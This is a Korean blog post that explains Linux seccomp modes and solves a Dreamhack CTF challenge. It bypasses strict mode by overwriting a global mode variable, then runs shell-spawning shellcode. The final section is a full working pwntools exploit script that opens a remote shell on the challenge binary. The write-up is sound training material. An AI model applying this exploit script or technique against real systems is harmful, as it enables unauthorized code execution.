---
layout: post
title:  "첫 Seccomp Bypass 공부"
date:   2020-10-03
categories: ["2020","pwnable"]
update: 2020-10-03
comment: true
tags: [pwnable]
---





dreamhack 50등을 향한 마지막 문제로 Seccomp filtering을 우회하는 문제를 풀었다. 처음 만나본 거라서 천천히 강의 내용 읽고, 코드 읽고 풀어봤다.

# 🤔 SECCOMP?

## Introduction

![image](https://user-images.githubusercontent.com/51329156/94989512-5f870800-05b0-11eb-9d95-614e91286e02.png)

Linux kernel은 많은 `syscall`들을 유저권한의 프로세스들에게 노출시킨다. 근데 그 `syscall`들을 모두 쓰는 게 아니고, 일부만 쓰고 나머지 `syscall`들은 사용되지 않은 채로 둔다. 프로세스가 다른 위험한 `syscall`을 호출하게 두는 것은 보안상 문제가 있다. 이를 위해 사용하는 것이 **SECCOMP(SECure COMPuting mode)** 이다.

**Seccomp filtering**은 프로세스의 `syscall` 요청들을 필터링하는 매커니즘이다. 위의 사진을 보면 프로세스가 `syscall`을 한 후, filter들을 통과하지 못하면 `SIGKILL`으로 프로세스를 종료시킨다.



## ❓ HOW TO USE SECCOMP

**SECCOMP** 기능은 `prtcl()` 함수로 사용할 수 있다.

``` c
int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
```

`option` 에 **PR_SET_SECCOMP**를 주면 **SECCOMP**를 설정할 수 있다.

**SECCOMP**를 설정할 때 사용할 수 있는 모드가 3가지 있다.

**seccomp.h**

``` c
#define SECCOMP_MODE_DISABLED	0 /* seccomp is not in use. */
#define SECCOMP_MODE_STRICT	1 /* uses hard-coded filter. */
#define SECCOMP_MODE_FILTER	2 /* uses user-supplied filter. */
```

### SECCOMP_MODE_STRICT

`read`, `write`, `exit`, `sigreturn` 시스템 콜의 호출만 허용하고, 이외의 시스템 콜의 호출 요청이 들어오면 SIGKILL 시그널을 발생하고 프로그램을 종료한다.

아래처럼 설정한다:

``` c
prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);
```



### SECCOMP_MODE_FILTER

필터링할 시스템 콜을 직접 지정해준다. 시스템콜을 관리할 때 **BPF(Berkeley Packet Filter)**라는 필터식을 이용해서 관리한다. **BPF**는 네트워크 패킷을 필터링하기 위해 만들어진 필터링 매커니즘인데, **SECCOMP**를 사용할 때도 이를 사용해 필터를 작성한다.

이 모드를 사용하려면 `no_new_privs` 비트가 설정되어 있어야 한다.

``` c
prctl(PR_SET_NO_NEW_PRIVS, 1)
```

그리고나서 아래처럼 설정한다:

```
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, args);
```

이 모드를 사용할 때는 세 번째 인자로 전달되는 구조체인 `sock_fprog`에 대한 이해가 필요한데, 이 부분은 문제랑은 상관이 없어서 패스하도록 하겠다.



# SECCOMP BYPASS

## 🔎 Code

필요한 부분만 추려봤다:

``` c
...
int mode = SECCOMP_MODE_STRICT;
...
    if ( prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1 ) {
        perror("prctl(PR_SET_NO_NEW_PRIVS)\n");
        return -1;
        }
    if ( prctl(PR_SET_SECCOMP, mode, &prog) == -1 ) {
        perror("Seccomp filter error\n");
        return -1;
        }
...
shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
...
    switch(idx) {
            case 1:
                if(cnt != 0) {
                    exit(0);
                }

                syscall_filter();
                printf("shellcode: ");
                read(0, shellcode, 1024);
                cnt++;
                break;
            case 2:
                sc = (void *)shellcode;
                sc();
                break;
            case 3:
                printf("addr: ");
                scanf("%ld", &addr);
                printf("value: ");
                scanf("%ld", addr);
                break;
            default:
                break;
        }
```

이상하다고 느낀 점 👓

- 배울 때는 **FILTER_MODE** 일 때 `prctl()`에게 세 번째 인자로 `sock_fprog`의 주소를 준다고 배웠다. 근데 **STRICT_MODE**인데도 줬다.
- `PR_SET_NO_NEW_PRIVS`도 마찬가지..

코드는 간단하다. `READ|WRITE|EXEC` 권한을 준 영역이 있다. 쉘코드를 입력할 수 있고, 실행도 할 수 있다. 원하는 주소에 값을 넣는 것도 가능하다.

일반적으로 사용하는 쉘코드는 `execve('/bin/sh')`의 기계어 코드다. `execve`는 **STRICT_MODE**에서 허용되지 않는 시스템 콜이다. 그래서 어떻게 우회해야 하지 생각하다가 `case 3`과 아까 이상하다고 느낀 점이 딱 맞아떨어져서 풀었다.

`mode`가 전역변수로 선언되어 있고, PIE가 꺼져있기 때문에 주소를 구할 수 있다. 현재 그 주소에 들어있는 값은 `0x1`이다. 이 것을  `0x2`로 바꿔주면  설정해준 필터가 없기 때문에 모든 시스템 콜을 사용할 수 있다! 그러면 `execve` 시스템 콜을 사용해서 쉘을 딸 수 있다 (`0x0`도 가능) 👍

## 🚀 Exploit

값을 바꾸기 전 **SECCOMP_MODE_STRICT**로 설정되어 있는 `mode` 변수 :

![image](https://user-images.githubusercontent.com/51329156/94990260-a297aa00-05b5-11eb-9a2a-6edf7f51e7ef.png)

저 변수의 값을 `case 3`을 이용해 `0x2`로 바꿔준다.

![image](https://user-images.githubusercontent.com/51329156/94990326-2b164a80-05b6-11eb-96c4-96b59eed8e92.png)

64비트 쉘코드를 `case 1`을 이용해 쓴다.

![image](https://user-images.githubusercontent.com/51329156/94990246-7bd97380-05b5-11eb-9d76-fe7f3cd4abcb.png)

`case 2`를 이용해 실행하면 된다.

### ex.py

``` python
#!/usr/bin/python
# coding=utf-8
from pwn import *
import sys

context.arch = 'x86_64'
context.log_level='debug'

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('🤐',22463)
elif sys.argv[1]=="-l":
    p = process('🤐')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)

e=ELF('🤐')

# Adderss
mode_addr=e.symbols['mode']

log.info("mode address: {}".format(hex(mode_addr)))
shellcode=asm(shellcraft.amd64.linux.sh())

p.sendlineafter("> ","3")
p.sendlineafter("addr: ",str(mode_addr))
p.sendlineafter("value: ",str(2))


p.sendlineafter("> ","1")
p.sendlineafter("shellcode: ",shellcode)

p.sendlineafter("> ","2")

p.interactive()
```

![image](https://user-images.githubusercontent.com/51329156/94990373-7f212f00-05b6-11eb-9032-6eb912991047.png)

❗ 새로 배운 개념이긴 했는데 문제가 워낙 쉽고 저번에 디버깅 연습해놓은 게 있어서 생각보다 금방 풀었다 !



> 🚀 참고
>
> [https://velog.io/@woounnan/LINUX-Seccomp](https://velog.io/@woounnan/LINUX-Seccomp) - HOW TO USE SECCOMP
>
> [http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/02/04/seccomp](http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/02/04/seccomp) - Introduction
>
> [https://dreamhack.io/learn/2/11#31](https://dreamhack.io/learn/2/11#31) - HOW TO USE SECCOMP

 